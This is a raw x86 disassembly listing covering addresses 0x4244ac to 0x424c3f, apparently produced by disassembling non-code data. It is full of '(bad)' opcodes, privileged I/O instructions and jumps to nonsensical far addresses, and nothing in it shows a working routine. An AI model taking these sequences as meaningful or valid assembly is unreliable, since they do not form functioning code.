  4244ac:	and    eax,0xfb9ac978
  4244b1:	dec    ebx
  4244b2:	sbb    eax,0xb35652f3
  4244b7:	xchg   esp,eax
  4244b8:	jmp    0x8d14b37e
  4244bd:	in     eax,dx
  4244be:	in     al,dx
  4244bf:	sbb    DWORD PTR [ebx+0x40],eax
  4244c2:	push   0xffffffa7
  4244c4:	loopne 0x42451b
  4244c6:	pop    edx
  4244c7:	(bad)  
  4244c8:	mov    WORD PTR [edx+0x482b5de5],ss
  4244ce:	push   edx
  4244cf:	cmp    BYTE PTR [ebx-0x6f],dl
  4244d2:	inc    ecx
  4244d3:	mov    edx,0x5a35ae3d
  4244d8:	mov    ebx,0x68bd64ea
  4244dd:	mov    ds:0x4add3c7,al
  4244e2:	or     DWORD PTR [ebx+0x4d],ecx
  4244e5:	fist   WORD PTR [ecx]
  4244e7:	das    
  4244e8:	dec    esp
  4244e9:	cmp    ah,dh
  4244eb:	dec    ebp
  4244ec:	cli    
  4244ed:	add    eax,0x4f18784d
  4244f2:	cmp    al,0x53
  4244f4:	adc    al,0x53
  4244f6:	rcl    DWORD PTR ds:0xefddc01b,cl
  4244fc:	fld    TBYTE PTR [esi+0x7f]
  4244ff:	mov    ds:0xfe2da81a,eax
  424504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424505:	inc    ebx
  424506:	push   esp
  424507:	shr    BYTE PTR [ecx+ecx*8+0x67],0x64
  42450c:	dec    ecx
  42450d:	retf   0x5c7b
  424510:	mov    ds:0x1afeaa9a,al
  424515:	js     0x4244e9
  424517:	hlt    
  424518:	push   esp
  424519:	sub    ecx,esi
  42451b:	sahf   
  42451c:	maxps  xmm7,xmm4
  42451f:	push   eax
  424520:	sti    
  424521:	call   DWORD PTR [edx+ecx*4]
  424524:	dec    esp
  424525:	outs   dx,BYTE PTR ds:[esi]
  424526:	pop    ecx
  424527:	xchg   BYTE PTR [edi],bl
  424529:	clc    
  42452a:	icebp  
  42452b:	add    edi,DWORD PTR [ebx+0x5d]
  42452e:	iret   
  42452f:	xor    cl,BYTE PTR [edx]
  424531:	jle    0x424509
  424533:	pop    eax
  424534:	das    
  424535:	mov    al,0x20
  424537:	xor    DWORD PTR [ebx+edx*1],0x50
  42453b:	dec    edx
  42453c:	adc    al,0x14
  42453e:	push   0xfffffff3
  424540:	test   DWORD PTR ds:0x3b49fa96,ecx
  424546:	outs   dx,DWORD PTR ds:[esi]
  424547:	sub    esp,edx
  424549:	jg     0x424530
  42454b:	shl    DWORD PTR ds:0x1f8bc4f0,cl
  424551:	mov    ebp,0xeb6d04af
  424556:	ins    BYTE PTR es:[edi],dx
  424557:	inc    ebp
  424558:	mov    edx,DWORD PTR [ebp-0xf]
  42455b:	mov    ebp,0xa12cf4b2
  424560:	mov    ebp,0x1922f231
  424565:	iret   
  424566:	add    esp,edx
  424568:	sub    ah,ch
  42456a:	inc    edi
  42456b:	imul   edi,ebx,0x1c
  42456e:	(bad)  
  424570:	gs dec ebx
  424572:	adc    DWORD PTR [ecx],ebx
  424574:	test   eax,esi
  424576:	pop    ebp
  424577:	or     eax,0x26c38901
  42457c:	and    bl,BYTE PTR [ebx-0x25]
  42457f:	shr    BYTE PTR [edx],cl
  424581:	mov    DWORD PTR [ebp+eax*4+0x1da2f2eb],0xb8a52dcc
  42458c:	sbb    BYTE PTR [edi],dh
  42458e:	mov    eax,0xf605268c
  424593:	mov    ecx,0xbc875043
  424598:	jbe    0x4245b4
  42459a:	push   es
  42459b:	xrelease xchg BYTE PTR [edi-0x77cbcc6b],bh
  4245a2:	stos   BYTE PTR es:[edi],al
  4245a3:	lods   eax,DWORD PTR ds:[esi]
  4245a4:	cmp    DWORD PTR [eax],ebx
  4245a6:	ja     0x4245b7
  4245a8:	paddw  mm6,QWORD PTR [edi]
  4245ab:	push   DWORD PTR [edx]
  4245ad:	(bad)  
  4245af:	pop    edi
  4245b1:	sti    
  4245b2:	mov    ecx,0x6410e997
  4245b7:	jge    0x424542
  4245b9:	jo     0x4245c8
  4245bb:	stos   BYTE PTR es:[edi],al
  4245bc:	jmp    0xe70db39c
  4245c1:	jne    0x4245e2
  4245c3:	sbb    DWORD PTR [esi+ebx*4+0x46dca42d],eax
  4245ca:	jl     0x424634
  4245cc:	inc    ecx
  4245cd:	inc    ebp
  4245ce:	add    eax,0x215425fe
  4245d3:	jo     0x424617
  4245d5:	lahf   
  4245d6:	imul   edx,DWORD PTR [ebx-0x55],0xffffffeb
  4245da:	and    dh,BYTE PTR [edi]
  4245dc:	lods   eax,DWORD PTR ds:[esi]
  4245dd:	inc    ecx
  4245de:	and    BYTE PTR gs:[ecx],bl
  4245e1:	inc    edi
  4245e2:	pop    esp
  4245e3:	jmp    0x696:0x59398358
  4245ea:	or     edx,DWORD PTR [ecx]
  4245ec:	push   0x78
  4245ee:	in     al,dx
  4245ef:	pop    DWORD PTR [edx+0x26]
  4245f2:	dec    ecx
  4245f3:	pop    ebx
  4245f4:	push   cs
  4245f5:	inc    ebx
  4245f6:	or     ch,dl
  4245f8:	mov    ds:0xe52c5fc4,eax
  4245fd:	lock jmp 0x424635
  424600:	icebp  
  424601:	stos   DWORD PTR es:[edi],eax
  424602:	mov    dh,0x16
  424604:	cmp    BYTE PTR [edx+0x47],ah
  424607:	pop    ds
  424608:	inc    esp
  424609:	stc    
  42460a:	mov    esp,DWORD PTR [edx-0x48d5ede5]
  424610:	xor    al,0xdb
  424612:	fdiv   st(2),st
  424614:	call   0xd510:0xd41519dc
  42461b:	adc    al,0x94
  42461d:	out    0x23,al
  42461f:	or     BYTE PTR [ebx-0x5c],cl
  424622:	arpl   WORD PTR [esi+0x51beea9e],cx
  424628:	dec    ecx
  424629:	jae    0x424688
  42462b:	adc    al,0x72
  42462d:	(bad)  
  42462f:	mov    eax,edi
  424631:	bound  ebx,QWORD PTR [edi-0x2d]
  424634:	out    dx,al
  424635:	scas   eax,DWORD PTR es:[edi]
  424636:	pop    edx
  424637:	mov    edi,0x59ade91e
  42463c:	in     eax,0xf2
  42463e:	invd   
  424640:	dec    ebp
  424641:	popa   
  424642:	ds mov edx,0xef32ed36
  424648:	ins    DWORD PTR es:[edi],dx
  424649:	nop    ebx
  42464c:	cdq    
  42464d:	repz jne 0x424628
  424650:	outs   dx,BYTE PTR ds:[esi]
  424651:	lahf   
  424652:	mov    ah,0xc5
  424654:	mov    ah,0x83
  424656:	jbe    0x424601
  424658:	rcl    DWORD PTR es:[ebp-0xb2645e7],1
  42465f:	hlt    
  424660:	aaa    
  424661:	gs mov esi,0x7972319d
  424667:	push   edi
  424668:	mov    eax,ds:0xcb241ac4
  42466d:	xor    DWORD PTR [esi+ebp*1+0x68],eax
  424671:	jl     0x424624
  424673:	in     al,0x81
  424675:	adc    bl,dh
  424677:	clc    
  424678:	icebp  
  424679:	jns    0x42462e
  42467b:	xchg   edx,eax
  42467c:	out    dx,eax
  42467d:	inc    ebx
  42467e:	mov    dl,0x98
  424680:	(bad)  
  424681:	sar    DWORD PTR [ecx],1
  424683:	popf   
  424684:	outs   dx,DWORD PTR ds:[esi]
  424685:	iret   
  424686:	(bad)  
  424687:	mov    eax,DWORD PTR [ecx]
  424689:	inc    esi
  42468a:	fstp   QWORD PTR [edx+0x68f7254]
  424690:	adc    dl,0xc3
  424693:	mov    ch,0xba
  424695:	cmp    dl,ch
  424697:	loopne 0x424707
  424699:	or     BYTE PTR [ecx],dh
  42469b:	cld    
  42469c:	retf   0xd058
  42469f:	arpl   WORD PTR [esi+0x1666831a],cx
  4246a5:	outs   dx,BYTE PTR ds:[esi]
  4246a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4246a7:	xchg   ecx,eax
  4246a9:	mov    edi,0x3147f771
  4246ae:	int    0x84
  4246b0:	add    BYTE PTR [esp+edi*8],ah
  4246b3:	shl    DWORD PTR [ebx-0x28],cl
  4246b6:	loop   0x424698
  4246b8:	inc    eax
  4246b9:	dec    esp
  4246ba:	cmc    
  4246bb:	test   edi,edx
  4246bd:	stos   BYTE PTR es:[edi],al
  4246be:	arpl   WORD PTR [esi+ebp*2],si
  4246c1:	std    
  4246c2:	in     al,0xce
  4246c4:	sbb    al,0xd0
  4246c6:	push   eax
  4246c7:	cmp    BYTE PTR [ecx+0xe],dl
  4246ca:	xor    bl,BYTE PTR [esi+0x52]
  4246cd:	ins    BYTE PTR es:[edi],dx
  4246ce:	jo     0x4246be
  4246d0:	inc    eax
  4246d1:	xor    ah,BYTE PTR [esp+edi*2-0x33]
  4246d5:	mov    edx,0xb24742d0
  4246da:	sub    edx,0xce532cdb
  4246e0:	mov    ecx,edx
  4246e2:	test   DWORD PTR [ebx-0x7f],0xdb8da50d
  4246e9:	std    
  4246ea:	js     0x424708
  4246ec:	mov    esp,0xe2a62222
  4246f1:	retf   0x99b
  4246f4:	cmp    al,0x36
  4246f6:	push   edx
  4246f7:	pop    ds
  4246f8:	cmc    
  4246f9:	and    DWORD PTR [ecx-0x1a],edi
  4246fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246fd:	fwait
  4246fe:	clc    
  4246ff:	push   esi
  424700:	imul   ecx,DWORD PTR [esi],0x5d
  424703:	or     DWORD PTR [edx+0x73c18cdf],esp
  424709:	mov    cl,al
  42470b:	loope  0x42474f
  42470d:	jnp    0x424731
  42470f:	cli    
  424710:	inc    ecx
  424711:	sahf   
  424712:	int    0x4f
  424714:	pop    edx
  424715:	fnsave [edi]
  424717:	inc    edx
  424718:	add    al,BYTE PTR [ebx+0x7641ec71]
  42471e:	mov    dh,0x6c
  424720:	sub    eax,DWORD PTR [esi-0x4b]
  424723:	test   al,0x83
  424725:	cdq    
  424726:	leave  
  424727:	sub    al,0x4a
  424729:	out    0x9,al
  42472b:	pusha  
  42472c:	jnp    0x42472a
  42472e:	lock std 
  424730:	xchg   BYTE PTR [ebx+0x6b],bl
  424733:	outs   dx,DWORD PTR ds:[esi]
  424734:	nop
  424735:	xchg   esi,eax
  424736:	rcr    BYTE PTR [eax+0x2d5f66aa],cl
  42473c:	push   0x5b
  42473e:	dec    ebx
  42473f:	dec    edx
  424740:	nop
  424741:	dec    ebp
  424742:	in     eax,dx
  424743:	popf   
  424744:	sbb    ebp,DWORD PTR [edi]
  424746:	into   
  424747:	mov    ebp,0x7aa51e3
  42474c:	dec    edi
  42474d:	std    
  42474e:	sub    al,0x29
  424750:	(bad)  
  424752:	cmp    ebp,edi
  424754:	pop    ebp
  424755:	mov    WORD PTR [ebp+0x734a8028],ds
  42475b:	sbb    BYTE PTR [ebx],0x5
  42475e:	out    dx,eax
  42475f:	mov    ecx,gs
  424761:	xchg   esi,eax
  424762:	lods   eax,DWORD PTR ds:[esi]
  424763:	fsub   DWORD PTR [edi+0x5a]
  424766:	das    
  424767:	(bad)  
  424768:	les    edi,FWORD PTR [edx-0x3e980fe2]
  42476e:	fst    DWORD PTR [esi+ebx*8-0x4]
  424772:	test   al,0xc6
  424774:	mov    ds:0xc4349879,al
  424779:	cs pop edx
  42477b:	xor    eax,0x407cd885
  424780:	mov    edi,0x87a70eb1
  424785:	mov    WORD PTR [edx+0x5ff9d09e],?
  42478b:	fisub  WORD PTR [esi+edi*4]
  42478e:	(bad)  
  42478f:	hlt    
  424790:	fwait
  424791:	adc    bl,BYTE PTR [esi]
  424793:	inc    esi
  424794:	and    cl,BYTE PTR [ebp+ecx*2-0x25fe2b4d]
  42479b:	pop    ebp
  42479c:	cmp    DWORD PTR [ecx+0x42],esi
  42479f:	mov    bl,0xf4
  4247a1:	pop    ebp
  4247a2:	cmp    DWORD PTR [eax],eax
  4247a4:	daa    
  4247a5:	xor    DWORD PTR [esi+0x1e80c504],esi
  4247ab:	in     al,0x72
  4247ad:	popf   
  4247ae:	xchg   BYTE PTR [edi-0x14eab978],bh
  4247b4:	shr    DWORD PTR [eax+0x48],1
  4247b7:	cmp    DWORD PTR [ebx+0x67c7adb0],edx
  4247bd:	adc    eax,0x788e3e86
  4247c2:	push   0xffffff80
  4247c4:	push   ebx
  4247c5:	jp     0x42475e
  4247c7:	jecxz  0x424787
  4247c9:	es xchg ebp,eax
  4247cb:	xchg   DWORD PTR [ebp-0x8],ebx
  4247ce:	shl    BYTE PTR [eax],0xd2
  4247d1:	inc    esp
  4247d2:	pop    es
  4247d3:	fld    DWORD PTR [edx+ebp*1]
  4247d6:	and    BYTE PTR [eax+0x31c1e4d3],0x14
  4247dd:	sbb    DWORD PTR [ebx+0x25cd04af],eax
  4247e3:	lahf   
  4247e4:	xchg   ebx,eax
  4247e5:	rol    BYTE PTR [edi-0x62],0xa1
  4247e9:	xor    eax,0x7e0056c8
  4247ee:	daa    
  4247ef:	rcr    DWORD PTR [edx-0x7b],0x6d
  4247f3:	cmp    al,0xdf
  4247f5:	adc    edx,DWORD PTR [edx-0x27]
  4247f8:	add    eax,0x208c3c39
  4247fd:	push   0x137d54b1
  424802:	aas    
  424803:	ins    BYTE PTR es:[edi],dx
  424804:	mov    ds:0x33e34981,al
  424809:	(bad)  
  42480a:	in     eax,0x90
  42480c:	dec    edx
  42480d:	inc    esi
  42480e:	out    0x6b,eax
  424810:	pusha  
  424811:	sub    eax,DWORD PTR [esi]
  424813:	pop    ss
  424814:	adc    esi,DWORD PTR [esi-0x6414a6b7]
  42481a:	lods   eax,DWORD PTR ds:[esi]
  42481b:	pop    edx
  42481c:	and    bh,BYTE PTR [esi+0x28]
  42481f:	pop    ecx
  424820:	mov    eax,ds:0x1506ac64
  424825:	sub    BYTE PTR ds:0xfcb32c46,0x77
  42482c:	repnz xor ebx,DWORD PTR [edi-0x22]
  424830:	pop    edi
  424831:	scas   al,BYTE PTR es:[edi]
  424832:	push   0x4cfa9c9d
  424837:	jle    0x874cf52c
  42483d:	(bad)  
  42483e:	cld    
  42483f:	(bad)  
  424840:	sti    
  424841:	mul    BYTE PTR [edi]
  424843:	or     BYTE PTR [ecx],0xb
  424846:	pop    ss
  424847:	retf   0x1dc4
  42484a:	aaa    
  42484b:	iret   
  42484c:	adc    al,BYTE PTR [ecx+0x56]
  42484f:	jo     0x42482a
  424851:	hlt    
  424852:	jp     0x424803
  424854:	jbe    0x4248ba
  424856:	lods   eax,DWORD PTR ds:[esi]
  424857:	cmp    cl,BYTE PTR [ebp-0x239bd0a2]
  42485d:	pop    edi
  42485e:	add    al,0x26
  424860:	(bad)  
  424861:	mov    al,ds:0x2a816c4d
  424866:	xchg   DWORD PTR [ebp+0x79],esp
  424869:	lods   al,BYTE PTR ds:[esi]
  42486a:	inc    ecx
  42486b:	cs push edx
  42486d:	shl    BYTE PTR [ebp-0x12],0x2f
  424871:	in     al,0x4f
  424873:	xchg   DWORD PTR [eax+0x7f],esp
  424876:	pushf  
  424877:	inc    ebp
  424878:	sbb    edi,DWORD PTR [esi-0x3e7c2a4]
  42487e:	jae    0x424855
  424880:	jle    0x4248c8
  424882:	cmp    al,0xa2
  424884:	mov    dh,0x59
  424886:	std    
  424887:	repz cmp ebp,edx
  42488a:	jns    0x4248be
  42488c:	cs aad 0x6e
  42488f:	mov    dl,0x77
  424891:	xchg   ebp,eax
  424892:	adc    ch,ch
  424894:	cmp    eax,0x55ffa64a
  424899:	pop    es
  42489a:	retf   
  42489b:	cmp    BYTE PTR [ebx],dl
  42489d:	pop    esp
  42489e:	lods   eax,DWORD PTR ds:[esi]
  42489f:	dec    eax
  4248a0:	popf   
  4248a1:	rcr    ecx,cl
  4248a3:	ss push ecx
  4248a5:	pop    edx
  4248a6:	les    esi,FWORD PTR [esi+0x1d4ccbf5]
  4248ac:	outs   dx,BYTE PTR ds:[esi]
  4248ad:	lds    esi,FWORD PTR [edi+0x37]
  4248b0:	addr16 adc ebp,ebx
  4248b3:	cmp    cl,dh
  4248b5:	aaa    
  4248b6:	sub    BYTE PTR [ebx],dl
  4248b8:	pop    ebp
  4248b9:	cdq    
  4248ba:	setns  BYTE PTR [edi]
  4248bd:	stos   DWORD PTR es:[edi],eax
  4248be:	dec    ebp
  4248bf:	rol    BYTE PTR ds:0x5919ed5,0x5d
  4248c6:	test   DWORD PTR [eax-0x15],0xee80d30f
  4248cd:	add    ebp,DWORD PTR [edi-0x1a671a26]
  4248d3:	es push cs
  4248d5:	repz adc ah,BYTE PTR [edi-0x47]
  4248d9:	sbb    BYTE PTR [esi+0x5dec286c],dh
  4248df:	in     al,dx
  4248e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248e1:	jb     0x424875
  4248e3:	jae    0x424887
  4248e5:	dec    eax
  4248e6:	mov    WORD PTR [esi+0x6e246a1b],fs
  4248ec:	mov    ecx,0x2a28ea1c
  4248f1:	ss mov ebp,0x19f595aa
  4248f7:	pop    ss
  4248f8:	fwait
  4248f9:	out    dx,eax
  4248fa:	in     al,0x10
  4248fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4248fd:	and    DWORD PTR [esi],esi
  4248ff:	push   ebx
  424900:	mov    ebx,0x88b4b095
  424905:	retf   
  424906:	jae    0x4248de
  424908:	iret   
  424909:	iret   
  42490a:	es (bad) 
  42490c:	or     ebx,DWORD PTR [edi]
  42490e:	mov    ebp,0x805dd1db
  424913:	inc    BYTE PTR [eax+ebp*2+0x3d]
  424917:	push   eax
  424918:	xchg   BYTE PTR [ebp-0x3a],dh
  42491b:	sub    bh,BYTE PTR [edx+edi*1]
  42491e:	or     cl,BYTE PTR [edi]
  424920:	mov    ds:0x9704f2ba,eax
  424925:	xchg   ebx,eax
  424926:	adc    BYTE PTR [ebx-0x26],dl
  424929:	or     ecx,ecx
  42492b:	adc    DWORD PTR [edx-0x2c],esi
  42492e:	fwait
  42492f:	ret    
  424930:	xchg   edx,eax
  424931:	and    ch,bl
  424933:	push   0x4e4e4546
  424938:	xor    ebx,DWORD PTR [edx-0x44]
  42493b:	sub    DWORD PTR [ebp+0x5d],ecx
  42493e:	adc    DWORD PTR [edi],0x53
  424941:	jecxz  0x42496e
  424943:	mov    bh,0x60
  424945:	dec    edx
  424946:	or     BYTE PTR [edi+0x220fcd33],dl
  42494c:	push   0xffffffe4
  42494e:	adc    bh,BYTE PTR [eax-0x47152368]
  424954:	fnclex 
  424956:	stos   BYTE PTR es:[edi],al
  424957:	and    ah,BYTE PTR [ebx-0x11370a4e]
  42495d:	xchg   ebx,eax
  42495e:	dec    esi
  42495f:	push   cs
  424960:	data16 (bad) 
  424962:	push   cs
  424963:	jne    0x42496d
  424965:	sbb    al,0x38
  424967:	push   ebx
  424968:	bound  ebx,QWORD PTR [ecx]
  42496a:	(bad)  [esi+0x35b643f]
  424970:	fdivr  st,st(2)
  424972:	dec    esi
  424973:	jg     0x4249a7
  424975:	shl    ecx,1
  424977:	dec    eax
  424978:	fistp  WORD PTR [edx+0x453c5c7a]
  42497e:	int3   
  42497f:	ror    DWORD PTR [edx],0x30
  424982:	cli    
  424983:	addr16 nop
  424985:	jl     0x4249be
  424987:	repnz jecxz 0x42497a
  42498a:	out    dx,eax
  42498b:	xlat   BYTE PTR ds:[ebx]
  42498c:	sbb    BYTE PTR ds:0xa405c662,dh
  424992:	dec    esp
  424993:	xchg   edi,eax
  424994:	repnz sahf 
  424996:	xor    ecx,esp
  424998:	jne    0x424934
  42499a:	pop    ebx
  42499b:	fist   DWORD PTR [edi]
  42499d:	push   cs
  42499e:	fisub  WORD PTR [esi]
  4249a0:	xlat   BYTE PTR ds:[ebx]
  4249a1:	cld    
  4249a2:	dec    ebp
  4249a3:	and    bh,BYTE PTR ds:0xb835e412
  4249a9:	lahf   
  4249aa:	mov    edi,0x2a8def7d
  4249af:	hlt    
  4249b0:	dec    esi
  4249b1:	add    al,bh
  4249b3:	and    al,0xd7
  4249b5:	xchg   ebp,eax
  4249b6:	test   edi,edx
  4249b8:	or     al,0x3c
  4249ba:	in     al,dx
  4249bb:	push   esp
  4249bc:	out    dx,eax
  4249bd:	fiadd  WORD PTR [esi+0x233109f1]
  4249c3:	push   ss
  4249c4:	jno    0x42498f
  4249c6:	neg    eax
  4249c8:	cmp    al,0xdb
  4249ca:	mov    al,ds:0xfb903ea6
  4249cf:	int3   
  4249d0:	or     DWORD PTR [esi+0x52],ecx
  4249d3:	out    dx,al
  4249d4:	and    edx,DWORD PTR [ecx+ecx*2+0x3a197dea]
  4249db:	inc    edi
  4249dc:	ins    BYTE PTR es:[edi],dx
  4249dd:	xor    edi,DWORD PTR [edx]
  4249df:	ror    BYTE PTR [ebx+0x6a],cl
  4249e2:	or     ebp,DWORD PTR [edi]
  4249e4:	xor    edx,DWORD PTR [edx-0x1a]
  4249e7:	stos   BYTE PTR es:[edi],al
  4249e8:	loope  0x424a5c
  4249ea:	pop    ebp
  4249eb:	and    esi,DWORD PTR [ebp-0x25]
  4249ee:	(bad)  
  4249ef:	jne    0x424a6b
  4249f1:	les    ecx,FWORD PTR [ecx+0x51]
  4249f4:	jb     0x42498a
  4249f6:	adc    DWORD PTR [ebp-0x19608964],ebx
  4249fc:	mov    edi,0xf4925ef0
  424a01:	clc    
  424a02:	adc    bh,bh
  424a04:	dec    ecx
  424a05:	cmc    
  424a06:	in     eax,0xe2
  424a08:	fcomp  DWORD PTR [edx]
  424a0a:	popa   
  424a0b:	cmp    eax,0xb1032462
  424a10:	push   ebx
  424a11:	mov    eax,0x51a37131
  424a16:	mov    ch,0xb9
  424a18:	mov    ah,0x2a
  424a1a:	adc    DWORD PTR [ebp-0x77cdea3f],esp
  424a20:	neg    BYTE PTR [edx+0x24]
  424a23:	or     BYTE PTR [esi],bl
  424a25:	lahf   
  424a26:	test   DWORD PTR [ebp-0x25],esp
  424a29:	mov    eax,0x5105e6db
  424a2e:	pop    ds
  424a2f:	adc    DWORD PTR [eax],ebp
  424a31:	mov    ebx,0xe002fa43
  424a36:	into   
  424a37:	cs inc esi
  424a39:	rcr    ebx,1
  424a3b:	adc    DWORD PTR [edx],esi
  424a3d:	je     0x4249ee
  424a3f:	ins    DWORD PTR es:[edi],dx
  424a40:	in     al,dx
  424a41:	popa   
  424a42:	add    ch,BYTE PTR [ecx+ebp*2+0x703c1bad]
  424a49:	add    eax,0x78
  424a4c:	gs popa 
  424a4e:	pop    ss
  424a4f:	(bad)  
  424a50:	outs   dx,DWORD PTR ds:[esi]
  424a51:	hlt    
  424a52:	stc    
  424a53:	jle    0x424ab8
  424a55:	inc    ebp
  424a56:	xor    al,BYTE PTR [eax+ecx*8+0x6b]
  424a5a:	xor    DWORD PTR [eax],edx
  424a5c:	mov    ch,0xd8
  424a5e:	dec    eax
  424a5f:	imul   ebx,DWORD PTR [edx-0x1f],0x5575fac0
  424a66:	mov    ch,0xcc
  424a68:	fbstp  TBYTE PTR [eax]
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	stos   DWORD PTR es:[edi],eax
  424a77:	loop   0x424a5f
  424a79:	ja     0x424a3b
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [eax+0x7b000006],cl
  424a83:	push   esp
  424a84:	adc    dl,BYTE PTR [esi]
  424a86:	lahf   
  424a87:	clc    
  424a88:	sub    cl,dl
  424a8a:	mov    ecx,0x49d4d99f
  424a8f:	into   
  424a90:	ret    0x3ad
  424a93:	inc    ebp
  424a94:	lahf   
  424a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a96:	int3   
  424a97:	and    dh,ch
  424a99:	sbb    dh,dh
  424a9b:	(bad)  
  424a9c:	cmp    eax,edi
  424a9e:	stc    
  424a9f:	imul   eax,DWORD PTR [esi+0x54],0xa89ad7d7
  424aa6:	mov    ds:0x484e8ec6,al
  424aab:	test   al,0xb2
  424aad:	loop   0x424a7d
  424aaf:	outs   dx,BYTE PTR ds:[esi]
  424ab0:	mov    ebx,0x2aa694fb
  424ab5:	adc    BYTE PTR [edi],cl
  424ab7:	jae    0x424a70
  424ab9:	es push edx
  424abb:	mov    edi,0x9eb66496
  424ac0:	or     al,BYTE PTR [ecx-0x25261853]
  424ac6:	add    ebx,DWORD PTR [ebp+0x6040eaae]
  424acc:	add    DWORD PTR [eax-0x3fda1b97],edi
  424ad2:	jecxz  0x424b11
  424ad4:	mov    esi,?
  424ad6:	dec    edx
  424ad7:	pop    esi
  424ad8:	or     eax,0xff7467bb
  424add:	sahf   
  424ade:	xchg   ebx,eax
  424adf:	rol    BYTE PTR [esi+0x16],cl
  424ae2:	cld    
  424ae3:	push   0xa2d741b8
  424ae8:	xor    dh,BYTE PTR [esp+esi*4]
  424aeb:	(bad)  
  424aec:	icebp  
  424aed:	sahf   
  424aee:	lds    eax,FWORD PTR [eax+0x10bd5589]
  424af4:	jno    0x424b0a
  424af6:	pop    eax
  424af7:	(bad)  
  424afa:	shr    BYTE PTR [eax-0x47b416f],0xca
  424b01:	cmp    bh,cl
  424b03:	and    ebx,edi
  424b05:	mov    al,ds:0xc553707
  424b0a:	push   es
  424b0b:	jle    0x424b31
  424b0d:	(bad)  
  424b0e:	hlt    
  424b0f:	add    eax,0xa576e14c
  424b14:	cmp    ah,BYTE PTR [ebx]
  424b16:	pop    ecx
  424b17:	jb     0x424ae6
  424b19:	mov    WORD PTR [eax-0x52],es
  424b1c:	xchg   esp,eax
  424b1d:	imul   ebp,DWORD PTR [edi+0x4],0xffffffcf
  424b21:	or     ebx,DWORD PTR [ecx]
  424b23:	ret    
  424b24:	inc    ebx
  424b25:	into   
  424b26:	fstp   QWORD PTR [edx+0x10d4b572]
  424b2c:	pop    edx
  424b2d:	sti    
  424b2e:	aas    
  424b2f:	in     eax,0x0
  424b31:	mov    ds:0xc6ef802a,al
  424b36:	xchg   DWORD PTR ds:0x22669d11,edx
  424b3c:	pushf  
  424b3d:	or     BYTE PTR [eax],bl
  424b3f:	inc    esi
  424b40:	fistp  DWORD PTR [eax]
  424b42:	mov    ebx,0xe5f31da0
  424b47:	adc    al,0xe6
  424b49:	int    0x8d
  424b4b:	pusha  
  424b4c:	mov    cl,0x61
  424b4e:	adc    DWORD PTR [ebp-0x20860ac5],ebp
  424b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b55:	sti    
  424b56:	cwde   
  424b57:	(bad)  
  424b58:	cwde   
  424b59:	sub    al,0xad
  424b5b:	imul   eax,DWORD PTR [ecx],0x8f29d7e
  424b61:	pop    ds
  424b62:	and    esi,DWORD PTR [edi]
  424b64:	add    BYTE PTR [edi],dl
  424b66:	add    BYTE PTR [ecx+ebp*4+0x1],cl
  424b6a:	jae    0x424af4
  424b6c:	imul   esp,esp,0x76f8f225
  424b72:	cmp    BYTE PTR [eax],bh
  424b74:	mov    eax,DWORD PTR [ecx+0x51]
  424b77:	fisub  DWORD PTR [ebp-0x62b9fd90]
  424b7d:	leave  
  424b7e:	loope  0x424be3
  424b80:	and    DWORD PTR [ebp+0xc],ecx
  424b83:	jecxz  0x424b9e
  424b85:	inc    ebx
  424b86:	xchg   edi,eax
  424b87:	test   al,0x70
  424b89:	cmp    al,0xa4
  424b8b:	jmp    0x398e:0x87de1008
  424b92:	cwde   
  424b93:	pop    es
  424b94:	leave  
  424b95:	int    0xb6
  424b97:	test   DWORD PTR [ecx],esp
  424b99:	imul   ebx,DWORD PTR [esi+0x3482886],0xbba75e9d
  424ba3:	and    BYTE PTR [edi+0x5f51bd13],cl
  424ba9:	imul   esi,DWORD PTR [eax+0x6ee62a69],0xffffffd5
  424bb0:	and    eax,0x51f983ee
  424bb5:	lds    esi,FWORD PTR [eax+0x643ed126]
  424bbb:	push   esp
  424bbc:	enter  0xde4,0xca
  424bc0:	add    bh,BYTE PTR [ebp+0x7d4f3f1d]
  424bc6:	cs mov ecx,0x68c512bf
  424bcc:	fwait
  424bcd:	sub    ebp,ecx
  424bcf:	ret    
  424bd0:	mov    ch,0x74
  424bd2:	mov    ?,WORD PTR [edi-0x3]
  424bd5:	imul   ebx,DWORD PTR [edi+0x7eb6fb37],0x4f
  424bdc:	inc    eax
  424bdd:	fbld   TBYTE PTR [esi]
  424bdf:	lahf   
  424be0:	add    eax,esp
  424be2:	cli    
  424be3:	mov    ecx,0xb3b591fb
  424be8:	aam    0x75
  424bea:	inc    edi
  424beb:	loop   0x424c14
  424bed:	pop    ds
  424bee:	xchg   ecx,eax
  424bef:	sub    BYTE PTR [esi],0x9c
  424bf2:	lods   al,BYTE PTR ds:[esi]
  424bf3:	stc    
  424bf4:	ret    
  424bf5:	jmp    0x94d3:0xd31d11fe
  424bfc:	mov    WORD PTR [esp+eiz*2-0x27],fs
  424c00:	cmp    ecx,DWORD PTR [esi-0x2c]
  424c03:	ss sbb dh,dh
  424c06:	jg     0x424c2d
  424c08:	pop    esi
  424c09:	stos   DWORD PTR es:[edi],eax
  424c0a:	rol    BYTE PTR [esi-0x80],1
  424c0d:	aad    0xe4
  424c0f:	cmp    BYTE PTR [edi],0xac
  424c12:	retf   
  424c13:	and    DWORD PTR [edx+0x67e127b1],eax
  424c19:	jae    0x424c5a
  424c1b:	pop    esp
  424c1c:	(bad)  
  424c1d:	or     DWORD PTR [edi+ebp*8],ecx
  424c20:	(bad)  
  424c21:	cmp    DWORD PTR [esi-0x72],esi
  424c24:	ret    
  424c25:	sbb    ebp,ebx
  424c27:	mov    ch,0xe4
  424c29:	test   ch,0xe8
  424c2c:	xchg   esi,eax
  424c2d:	adc    al,0x11
  424c2f:	fidiv  DWORD PTR [ebx-0x676f234b]
  424c35:	pop    edi
  424c36:	jge    0x424c03
  424c38:	pop    ebp
  424c39:	adc    BYTE PTR [ebp-0x5],dh
  424c3c:	clc    
  424c3d:	ss inc edx
  424c3f:	pop    es
